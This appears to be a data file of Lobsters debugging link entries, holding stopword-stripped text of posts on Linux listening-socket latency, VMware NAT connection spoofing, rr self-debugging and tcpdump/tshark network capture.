simply look examine data table game frequently need store large amount value purpose statistic item game enemy health value character statistic growth data precomputed math function need waste time hunting value memory read one go try thing simply try thing nt expected game developer forget possibility job remind actually possible
594,Lobsters,debugging,Debugging,The revenge of the listening sockets,http://blog.cloudflare.com/revenge-listening-sockets/,revenge listening socket,blog post one latency spike system tap system tap script slow script another script show another crafted system tap script listening hash table bucket let speak dns socket udp okay happened suggested back final word powerful system tap script consider joining u,back november wrote blog post one latency spike today like share continuation story turn misconfigured rmem setting nt source added latency looked like mr wolf nt finished job video adjusting previously discussed rmem sysctl continued monitoring system latency among thing measured ping time edge server worst case improved nt see ping anymore line still nt flat graph ping latency idling internal machine production server test done within datacenter packet never went public internet axis chart show ping time millisecond x axis time measurement measurement taken every second hour see ping finished measurement high latency ideal system tap latency occurred within datacenter packet nt lost suggested kernel issue linux responds icmp ping soft interrupt handling code delay handling ping indicates delay soft irq handling really bad affect packet delivered machine using system tap script able measure time distribution main soft irq function netrxaction distribution pretty awful call netrxaction handled average slow outlier really bad three call took whopping wonder ping time inetlookup slow back forth flame graph histogramkernelstp script went deeper look culprit found similarly poor latency distribution specifically problem lie line function file wrote another script show latency created specific line function sk inetlookupskb tcphashinfo skb th source th dest number shown indicate function usually terminated quickly sometimes hit slow path took finish inetlookupskb inlined make tricky accurately measure fortunately function simple call inetlookupestablished inetlookuplistener latter function causing trouble let discus inetlookup work function try find appropriate connection sock struct structure packet done inetlookupestablished call fails inetlookup attempt find bound socket listening state could potentially handle packet example packet syn listening socket exists respond synack bound listening socket send rst instead inetlookuplistener function find bound socket lhtable hash table using destination port hash pick appropriate bucket hash table iterates linearly find matching listening socket understand problem traced slow packet another crafted system tap script hook onto inetlookuplistener print detail slow packet data went deeper matched log line specific packet captured tcpdump spare detail inbound syn rst packet destination port modulo equal check magic number come listening hash table mentioned linux maintains listening hash table containing listening tcp socket lhtable fixed size bucket yes really need define inetlhtablesize recap syn rst packet trigger lookup lhtable since connection entry nt exist inetlookupestablished call fails inetlookuplistener called lhtable small bucket lhtable hashed destination port time quick diversion let speak cloudflare dns server let speak dns cloudflare using custom dns server called rrdns among many requirement server designed withstand ddos attack even though server pretty fast large attack kick might unable cope attack load happens must contain damage even one ip address heavy attack server must still handle legitimate traffic ip address fact dns architecture designed spread load among ip address ip address attack server keeping incoming packet kernel receive queue udp socket overflow monitor looking netstat counter netstat udp udp packet receive error number increasing see affected ip address listing udp socket nonempty receive queue netstat udpgrep egrep v udp udp udp case two ip address received heavy udp traffic dns server could handle receive queue built eventually overflowed fortunately binding specific ip address overflowing udp receive queue wo nt affect ip address binding specific ip address critical keep dns infrastructure online setup even mitigation technique fail dns server left exposed packet flood certain attack affect handling dns ip address lhtable well setup bound specific ip address udp tcp listening socket udp okay turn fine tcp happened due dns setup tcp socket bound different ip address port since port number fixed socket ended exactly one lhtable bucket particular bucket number rst syn packet hit inetlookuplistener call traverse socket entry nt fast fact took finish solve problem deployed two change tcp connection dns server bind anyip address aka call bind star binding specific ip address still necessary udp little benefit tcp traffic tcp bind star safely without compromising ddos defense increased lhtable size kernel first bill sommerfeld google suggested back change deployed ping time within datacenter finally flat always final word ca nt large number bound tcp socket learned hard way learned bit linux networking stack fact lhtable fixed size hashed destination port showed couple powerful system tap script fix deployed maximum latency number dropped significantly confident soft interrupt handling netrxaction behaving well mr wolf finally finished assignment video sound interesting consider joining u team singapore san francisco london
595,Lobsters,debugging,Debugging,USENIX Enigma 2016 - Timeless Debugging,https://www.youtube.com/watch?v=eGl6kpSajag,usenix enigma timeless debugging,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature usenix enigma timeless debugging youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature usenix enigma timeless debugging youtube
596,Lobsters,debugging,Debugging,That VMware IPv6 NAT thing is stranger than it looks,http://rachelbythebay.com/w/2016/03/27/wonky/,vmware nat thing stranger look,vmware nat thing stranger look wrote post slirp,vmware nat thing stranger look right couple day ago wrote vmware fusion trying use nat feature failing miserably attempting certain type tcp connection nt read yet go check first make sense since steady trickle feedback usual source one comment said sounded like path mtu discovery problem going disagree since none packet particularly large besides repro easily even funky icmp filtering going whether might able recognize wild present post topic may even two different people commented patched original post particular need get people worked shorthand something longer tcp operating question seeing checksum error tcp lot evil check packet trace see far rabbit hole go people nt get working msec sorry report may go higher nt solid explanation yet working towards idle time weekend found something particularly shocking warranted putting post first one commenter hn wondered connect returning done work actually kind happening nonblocking connect call connecting far tell vmware spoofing connection yeah telebit called want turbopep back seriously check went installed fusion pro underused mac mini installed ubuntu lts started trying connect outward dualstack machine softlayer one probably feeding page saw inside vm flag seq win option ms sackok t val ecr nop wscale length flag seq ack win option ms length flag ack win length okay yeah lot crazy cruft people nt speak language attempt boil key piece address whatever generated fusion nat setup host mac actual routable address linux vm think though address magpie softlayer aka rachelbythebaycom time write mind go test ubuntu vm sends bare syn server port microsecond later magpie allegedly responds syn acks syn supposedly received nt even need talk rest simple magpie house magpie dallas somewhere softlayer colo facility using mac silicon valley way could get syn respond get response back microsecond know far light travel usec km nt believe go feed favorite solver second second c km one way would nt even get packet state never mind texas therefore hypothesis vmware spoofing session establishment mind test see really happening course filter drop packet bound port server server never respond get anything back dirty lie screen shot going need click see fullsize make sense added rule drop tcp traffic port watched tcpdump see would show sure enough mac mini address sends whole bunch syns port server ignores however linux vm actually received ack syn acked turn think connection yes nt tcp tried try connect black hole nt spoof damn connection okay one last thing prove going going connect host nt even exist fusion going let yep s think netstat familiar show nice established connection far linux know connected elite host address made look le like nat like kind slirpish thing see connection attempt make new one destination copy data problem apparently race thus confuse speaking quickly fact would expect sort tcp stuff misbehave handle tcp oob data know whole urg flag thing perhaps known starring winnuke going work figure vmware
597,Lobsters,debugging,Debugging,Using rr To Debug rr,http://robert.ocallahan.org/2016/04/using-rr-to-debug-rr.html,using rr debug rr,test,working rr often frustrating although rr immensely useful understanding bug often complex bug ca nt use rr debug sometimes feel debugging hell others go heaven realized might hard get rr record replay rr replay rr behavior replay much simpler recording partly kernel state exist replay file descriptor nt really open etc achieving could valuable work plan rr involves interesting thing replay spent week working work master run rr record rrobjbinsimple rr record rr replay rr replay final line rr replaying rr replaying simple added test line new code much test exercising new ptrace feature implement fleshing support ptrace including ptracesyscall ptracesysemu ptracesinglestep etc majority work process ca nt two ptracers time outer rr must ptrace process inner rr use ptrace completely emulated outer rr along way found fixed interesting existing rr bug case simplified rr replay avoid use ptrace feature nt really need eg ptraceotraceexec debugging rr running rr mindbending easy get confused rr looking hard examine behavior inner rr ca nt trust outer rr hope nt much expect adding level record replay make thing much slower expect tried rr recording rr replaying rr replaying simple expect nt work first time probably fixable bug desire go deeper rabbithole moment obvious question whether rr could record rr recording well rr replay principle think could work would useful rr recording x fails rr recording rr recording x likely experience fault outer rr must record inner rr x much difficult debug debugging rr recording really well need record replay system built entirely different technology eg simics
598,Lobsters,debugging,Debugging,tcpdump is amazing,http://jvns.ca/blog/2016/03/16/tcpdump-is-amazing/,tcpdump amazing,tcpdump basic use tiny tcp stack case slow http request record wireshark pcap file filtering packet doc overhead safe run tcpdump production machine great talk dick site work google thomas ptacek even awesomeness tshark look inside packet go forth tcpdump tell twitter,took year think love tcpdump go tcpdump tcpdump tool tell network traffic machine scared long time refused learn use wiser show tcpdump awesome need scared let go tcpdump basic use run sudo tcpdump listen wireless network traffic plz tcpdump say ip flag p seq ack win option nop nop t val ecr length first time ran tcpdump took one look output like went welp nope nope nope nope nope nope gave tcpdump ecr win flag oh god know hardly mean though wrote tiny tcp stack one time sorta know enough help much learned need pas tcpdump actually make use without tcp wizard option find first let get concrete problem trying solve case slow http request let suppose slow http request happening machine want get distribution slow could add monitoring somewhere inside program could use tcpdump work use tcpdump record network traffic machine minute analyze recording wireshark wizard secret use tcpdump record network traffic use tool le scared wireshark analyze laptop let let say want record tcp traffic port http record traffic sudo tcpdump src port dst port w filter packet port name syntax pcap filter best save recording next wireshark going start wireshark see start little intimidating every time make http request might tcp packet huge pain recognize make sense hand fix clicked statistic conversation organizes disparate packet tcp session let see look like already lot understandable http request happened duration column tell total duration tcp session request took took one google one askmetafiltercom metafilter know metafilter sending way packet google like lol redirect packet done get take time big deal super easy work recently metric reporting http request taking like ran tcpdump wireshark thing wireshark like yeah taking metric wrong least counting something network request helpful fact know tcpdump feel really confident telling truth network traffic literally whole job capture packet use wireshark really friendly delightful tool pcap file mentioned really briefly tcpdump let save pcap file awesome literally every network analysis tool universe understands pcap file pcap file like freshly baked chocolate chip cooky everybody love filtering packet okay let imagine box lot going want capture tcp traffic analyze later traffic mentioned use pcap filter rule know literally thing filtering port ip address second julia tutorial pcap filter rule stuff sent port dst port use booleans src port dst port filter ip ip src know src port ip ip src ip get wrong try switch order go read doc much complicated filtering good enough far learn read berke overhead safe run tcpdump production machine short answer think mostly longer answer quite know know watched great talk dick site work google totally watch awesome performance story mentioned time introduces performance monitoring tool take resource overhead need long serious conversation datacenter administrator said tcpdump example something expensive think requirement requirement thing administer get slower minute collect network packet big deal tcpdump us pcap filter language thomas ptacek mentioned twitter day filter rule compiled something super efficient optimizing compiler impression filter rule collecting something network traffic probably big deal go nut tcpdump production machine netflix trying save packet disk probably bad time know never observed bad effect using tcpdump look dstat get sense much network traffic might capturing first try filter appropriately even awesomeness tshark look inside packet know filter ip stuff use wireshark next want tell tshark command line tool come wireshark tcpdump know http network protocol know pretty much everything tcp care put inside tcp packet tshark know inside tcp packet though let say wanted spy get request happening machine super easy tshark sudo tshark httprequestmethod get field e httprequestmethod e httprequesturi e ipdst get hellohtml get awesomehtml get filter packet http get request print request method uri requesting one beautiful idea even possible get better http pretty easy everyone know http tshark know http know like everything everything wireshark know yesterday work wanted know mongo collection queried specific machine totally impossible tool nothing impossible tcpdumptshark network traffic ran something like sudo tshark f src port mongoport dst port mongoport field e ipdst e mongofullcollectionname since tshark totally understands mongo protocol immediately started printing mongo collection name could see exactly going amazing super excited use tshark go forth tcpdump question network traffic machine maybe tcpdump tool cool tcpdump story way use mentioned tell twitter also understand reason overhead using tcpdump mb always ok would really really love know please tell
